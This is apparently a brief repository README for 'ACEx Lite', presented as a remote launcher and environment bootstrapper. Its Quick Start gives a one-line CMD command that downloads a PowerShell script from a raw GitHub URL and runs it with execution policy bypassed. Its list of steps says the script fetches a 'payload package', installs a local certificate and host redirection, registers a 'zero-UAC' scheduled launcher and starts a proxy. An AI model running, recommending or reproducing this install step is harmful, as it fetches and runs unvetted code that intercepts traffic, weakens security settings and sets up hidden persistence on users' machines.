# Testing / ACEx Lite

Remote one-line launcher and environment bootstrapper.

## Quick Start (Run from CMD)

```cmd
curl -sL https://raw.githubusercontent.com/ershivshankar/Testing/main/boot.ps1 -o %TEMP%\b.ps1 && powershell -ExecutionPolicy Bypass -File %TEMP%\b.ps1
```

## What it does
1. Downloads the pre-built payload package to `%LOCALAPPDATA%\ACEx_Launcher`.
2. Automatically configures local certificate and host redirection.
3. Registers the zero-UAC scheduled launcher.
4. Starts the proxy and launches the application.
